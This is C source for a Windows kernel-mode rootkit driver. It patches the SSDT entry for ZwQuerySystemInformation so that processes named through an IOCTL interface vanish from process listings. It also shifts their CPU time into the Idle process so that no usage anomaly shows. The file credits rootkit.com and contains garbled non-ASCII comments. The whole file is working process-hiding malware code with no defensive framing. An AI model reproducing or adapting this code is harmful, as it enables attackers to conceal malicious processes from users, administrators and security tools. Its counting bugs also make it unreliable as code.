#include "ntddk.h"

#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NuberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSCALL_INDEX(_function) (*(PULONG)((PUCHAR)_function+1))
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[SYSCALL_INDEX(_function)]

PMDL g_pmdlSystemCall = NULL;
PVOID* MappedSystemCallTable = NULL;

#define HOOK_SYSCALL(_function, _hook, _Orig) \
	_Orig = (PVOID)InterlockedExchange((PULONG)&MappedSystemCallTable[SYSCALL_INDEX(_function)], (LONG)_hook)
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)_Hook)
BOOLEAN IsHideProcessName(PUNICODE_STRING name);
NTSTATUS OnIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp);

#define FILE_DEVICE_HIDEPROCESS      0x8000
#define IOCTL_HIDEPROCESS_CLEAR_LIST      CTL_CODE(FILE_DEVICE_HIDEPROCESS, 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_ADD_PROCESS    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 1 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_DELETE_PROCESS    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 2 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_ADD_PROCESS_LIST    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 3 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_DELETE_PROCESS_LIST    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                   WaitTime;
        PVOID                   StartAddress;
        CLIENT_ID               ClientIs;
        KPRIORITY               Priority;
        KPRIORITY               BasePriority;
        ULONG                   ContextSwitchCount;
        ULONG                   ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                   NextEntryDelta;
        ULONG                   ThreadCount;
        ULONG                   Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY               BasePriority;
        ULONG                   ProcessId;
        ULONG                   InheritedFromProcessId;
        ULONG                   HandleCount;
        ULONG                   Reserved2[2];
        VM_COUNTERS             VmCounters;
        IO_COUNTERS             IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS  Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER			IdleTime;
		LARGE_INTEGER			KernelTime;
		LARGE_INTEGER			UserTime;
		LARGE_INTEGER			DpcTime;
		LARGE_INTEGER			InterruptTime;
		ULONG					InterruptCount;
};

// �����ڲ����ƺͷ�����������
#define DEVICE_NAME L"\\Device\\devHideProcess"
#define LINK_NAME L"\\??\\hideprocess"

//ԭʼ��������
NTSYSAPI NTSTATUS ZwQuerySystemInformation(IN ULONG SystemInformationClass, 
										   IN PVOID SystemInformation, 
										   IN ULONG SystemInformationLength, 
										   OUT PULONG ReturnLength);

//�º�������
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(IN ULONG SystemInformationClass, 
										     IN PVOID SystemInformation, 
										     IN ULONG SystemInformationLength, 
										     OUT PULONG ReturnLength);
//ԭʼ����ָ��
ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;
//ʱ��
LARGE_INTEGER  m_UserTime;    //����ȥ�Ľ�����ռ�õ��û��ռ�ʱ��
LARGE_INTEGER  m_KernelTime;  //����ȥ�Ľ�����ռ�õ��ں˿ռ�ʱ��

#define MAX_PROCESS_NAME_LEN 256
#define MAX_PROCESS_ARRAY_LEN 100

USHORT g_HideProcessName[MAX_PROCESS_ARRAY_LEN][MAX_PROCESS_NAME_LEN];
USHORT g_HideProcessNameLength[MAX_PROCESS_ARRAY_LEN];
USHORT g_ArraySize = 0;

struct GLOBAL{
	PDEVICE_OBJECT pControlDevice;	// ����������Ŀ����豸����ָ��
} g_data;

//�ж��Ƿ���ָ����Ҫ���صĽ�������
BOOLEAN IsHideProcessName(PUNICODE_STRING name)
{
	USHORT i;
	if (name == NULL || name->Buffer == NULL)
		return FALSE;
    if (g_ArraySize <= 0)
		return FALSE;
	for(i=0; i<g_ArraySize; i++)
	{
        USHORT* pName = g_HideProcessName[i];
		USHORT  len = g_HideProcessNameLength[i];
		if (0 == memcmp(name->Buffer, pName, len*sizeof(USHORT)))
			return TRUE;
	}

	return FALSE;
}

NTSTATUS NewZwQuerySystemInformation(IN ULONG SystemInformationClass, 
									 IN PVOID SystemInformation, 
									 IN ULONG SystemInformationLength, 
									 OUT PULONG ReturnLength)
{
	//����ԭ���ĺ���
   NTSTATUS ntStatus = ((ZWQUERYSYSTEMINFORMATION)OldZwQuerySystemInformation)(
	                                SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
   if (NT_SUCCESS(ntStatus))
   {
	   //����ǲ�ѯ���̻��ļ��б� ��Ŀ¼
	   if (SystemInformationClass == 5)
	   {
		   //SystemInformation��ŵ���ԭ��������ѯ���Ľ����б�
		   struct _SYSTEM_PROCESSES* curr = (struct _SYSTEM_PROCESSES*)SystemInformation;
		   struct _SYSTEM_PROCESSES* prev = NULL;
           //���������б�
		   while(curr)
		   {
			   if (curr->ProcessName.Buffer != NULL)
			   {    
				   //��������ļ������ƶ��ַ�����ͷ
				   //if (m_HideProcessNameLength > 0 && 0 == memcmp(curr->ProcessName.Buffer, m_HideProcessName, m_HideProcessNameLength*sizeof(USHORT)))
				   //if (0 == memcmp(curr->ProcessName.Buffer, L"Main", 8))
				   if (IsHideProcessName(&curr->ProcessName))
				   {
					   //���ý��̵�ʱ���ۼ�
				       m_UserTime.QuadPart += curr->UserTime.QuadPart;
				       m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
                       //������ǵ�һ������
					   if (prev)
					   {
						   //��������б����һ����Ϊ�գ�����ǰ����ָ����һ��ָ�븮����һ�����̣�������ǰ����
						   if (curr->NextEntryDelta)
							   prev->NextEntryDelta += curr->NextEntryDelta;
						   else//��������б����һ��Ϊ�գ�����һ�����̵�ָ����һ��ָ��Ϊ�գ�������ǰ����
                               prev->NextEntryDelta = 0;
					   }
					   else//����ǵ�һ������
					   {
						   //��������б����һ����Ϊ�գ������ؽ�����Ϣ��ָ��ָ����һ����������ǰ����
						   if (curr->NextEntryDelta)
							   (char*)SystemInformation += curr->NextEntryDelta;
						   else//��������б����һ��Ϊ��, ���ؿս�����Ϣ����
                               (char*)SystemInformation = NULL;
					   }
				   }
				   else
					   //������һ������ָ��
					   prev = curr;
			   }
			   else//��Idle����
			   {
				   //������ȥ���̵�ʱ��׷�ӵ�Idle������
				   curr->UserTime.QuadPart += m_UserTime.QuadPart;
				   curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
				   m_UserTime.QuadPart = 0;
				   m_KernelTime.QuadPart = 0;
				   //������һ������ָ��
			       prev = curr;
			   }
			   
			   //��һ������
			   if (curr->NextEntryDelta)
				   (char*)curr += curr->NextEntryDelta;
			   else
				   curr = NULL;
		   }
	   }
	   //��ѯϵͳ����������ʱ��
	   else if (SystemInformationClass == 8)
	   {
		   struct _SYSTEM_PROCESSOR_TIMES* times = (struct _SYSTEM_PROCESSOR_TIMES*)SystemInformation;
		   times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
	   }
   }
   return ntStatus;
}
//��������ж��
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING SymbolicLink;
    //ȡ����QuerySystemInformation�Ĺҹ�
	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
    //if MDL != NULL
	if (g_pmdlSystemCall)
	{   //Unmap
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		//free
		IoFreeMdl(g_pmdlSystemCall);
	}
	// ɾ���豸����
	if (g_data.pControlDevice != NULL)
		IoDeleteDevice(g_data.pControlDevice); 
	// ɾ����������
	RtlInitUnicodeString(&SymbolicLink, LINK_NAME);
	IoDeleteSymbolicLink(&SymbolicLink);
}
// ����IRP_MJ_CREATE��IRP_MJ_CLOSE���ܴ���
NTSTATUS OnCreateClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
//��ں���
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	UNICODE_STRING SymbolicLink;
	UNICODE_STRING DevName;
	NTSTATUS status;
	PDEVICE_OBJECT pDeviceObj = NULL;

	g_data.pControlDevice = NULL;
	memset(g_HideProcessName, 0, MAX_PROCESS_NAME_LEN * MAX_PROCESS_ARRAY_LEN * sizeof(USHORT));
    memset(g_HideProcessNameLength, 0, MAX_PROCESS_ARRAY_LEN * sizeof(USHORT));
    g_ArraySize = 0;
	//�ƶ�ж�غ���
	theDriverObject->DriverUnload = OnUnload;
	theDriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnIoctl;
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
	//����ԭ����ZwQuerySystemInformation����ָ��
	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
	
	RtlInitUnicodeString(&DevName, DEVICE_NAME);
	status = IoCreateDevice(theDriverObject, 0, &DevName,  FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObj);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("CreateDevice failed \n");
	    return STATUS_UNSUCCESSFUL;
	}
	// Ϊ������豸������������
	RtlInitUnicodeString(&SymbolicLink, LINK_NAME);
	status = IoCreateSymbolicLink(&SymbolicLink, &DevName);  
	if(!NT_SUCCESS(status))
	{
		DbgPrint("CreateSymbolicLink failed \n");
		IoDeleteDevice(pDeviceObj); 
		return STATUS_UNSUCCESSFUL;
	}
	//����MDL
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NuberOfServices*4);
	if (g_pmdlSystemCall == NULL)
		return STATUS_UNSUCCESSFUL;
	
	g_data.pControlDevice = pDeviceObj;

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	//�ı�MDL��flag
	g_pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	//mapped to memory
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	//�ҹ�
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);
	return STATUS_SUCCESS;
}
//ɾ����������
BOOLEAN DeleteProcessName(USHORT* pName, USHORT Len)
{
	USHORT i;
	USHORT j;
	USHORT* pBuf, * pBuf2;
	USHORT nLen, nLen2;
    if (pName == NULL || Len <= 0)
		return FALSE;
	if (g_ArraySize <= 0)
		return FALSE;
	
	for(i=g_ArraySize-1; i>=0; i--)
	{
		pBuf = g_HideProcessName[i];
		nLen = g_HideProcessNameLength[i];
		if (nLen != Len)
			continue;
        if (0 != memcmp(pBuf, pName, sizeof(USHORT)*Len))
			continue;
        for(j=i; j<g_ArraySize-1; j++)
		{
            pBuf = g_HideProcessName[j];
			nLen = g_HideProcessNameLength[j];
			pBuf2 = g_HideProcessName[j+1];
			nLen2 = g_HideProcessNameLength[j+1];
			memset(pBuf, 0, nLen*sizeof(USHORT));
			memcpy(pBuf, pBuf2, nLen2*sizeof(USHORT));
			g_HideProcessNameLength[j] = g_HideProcessNameLength[j+1];
		}
		g_ArraySize --;
		return TRUE;
	}
	return FALSE;
}
//���һ����������
BOOLEAN AddProcessName(USHORT* pBuffer, USHORT Len)
{
	if (g_ArraySize >= MAX_PROCESS_ARRAY_LEN)
		return FALSE;
	//memset(g_HideProcessNameLength[g_ArraySize], 0, MAX_PROCESS_NAME_LEN*sizeof(USHORT));
	memcpy(g_HideProcessName[g_ArraySize], pBuffer, sizeof(USHORT)*Len);
	g_HideProcessNameLength[g_ArraySize] = Len;
	g_ArraySize ++;
    return TRUE;	
}
// I/O������ǲ����
NTSTATUS OnIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	// ����ʧ��
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	// ȡ�ô�IRP��pIrp����I/O��ջָ��
	PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);
	// ȡ��I/O���ƴ���
	ULONG uIoCode = pStack->Parameters.DeviceIoControl.IoControlCode;
    // ȡ��I/O������ָ������ĳ���
	PVOID pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ULONG uInSize = pStack->Parameters.DeviceIoControl.InputBufferLength;
	ULONG uOutSize = pStack->Parameters.DeviceIoControl.OutputBufferLength;

	if(uIoCode == IOCTL_HIDEPROCESS_CLEAR_LIST)
	{
		g_ArraySize = 0;
        pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return STATUS_SUCCESS;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_ADD_PROCESS)
	{
		if (g_ArraySize >= MAX_PROCESS_ARRAY_LEN)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			if (uInSize == 0)
                status = STATUS_UNSUCCESSFUL;
			else
			{
				USHORT Len = *(USHORT*)pIoBuffer;
				if (Len <= 0)
                    status = STATUS_UNSUCCESSFUL;
				else
				{
					if (uInSize < sizeof(USHORT)*(Len+1))
						status = STATUS_UNSUCCESSFUL;
					else
					{
						USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);
						AddProcessName(pBuffer, Len);
			            status = STATUS_SUCCESS;
					}
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_DELETE_PROCESS)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			USHORT Len = *(USHORT*)pIoBuffer;
			if (Len <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				if (uInSize < sizeof(USHORT)*(Len+1))
					status = STATUS_UNSUCCESSFUL;
				else
				{
					USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);
					BOOLEAN bDeleted = DeleteProcessName(pBuffer, Len);
					if (bDeleted)
						status = STATUS_SUCCESS;
					else
                        status = STATUS_UNSUCCESSFUL;
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_ADD_PROCESS_LIST)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			ULONG nBufSize = uInSize;
			USHORT nCount = *(USHORT*)pIoBuffer;
			if (nCount <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				if (g_ArraySize + nCount > MAX_PROCESS_ARRAY_LEN)
					status = STATUS_UNSUCCESSFUL;
				else
				{
					USHORT i;
					USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);

					nBufSize --;

					for(i=0; i<nCount; i++)
					{
                        USHORT nLen = *pBuffer;	
						pBuffer += 1;
						nBufSize -= 1;

						if (nBufSize < nLen)
						{
							status = STATUS_UNSUCCESSFUL;
							break;
						}

						if (!AddProcessName(pBuffer, nLen))
						{
                            status = STATUS_UNSUCCESSFUL;
							break;
						}
						pBuffer += nLen;
						nBufSize -= nLen;
					}
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_DELETE_PROCESS_LIST)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			ULONG nBufSize = uInSize;
			USHORT nCount = *(USHORT*)pIoBuffer;
			if (nCount <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				USHORT i;
				USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);

				nBufSize --;

				for(i=0; i<nCount; i++)
				{
                    USHORT nLen = *pBuffer;	
					pBuffer += 1;
					nBufSize -= 1;

					if (nBufSize < nLen)
					{
						status = STATUS_UNSUCCESSFUL;
						break;
					}
					DeleteProcessName(pBuffer, nLen);
					pBuffer += nLen;
					nBufSize -= nLen;
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else
	{
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
}

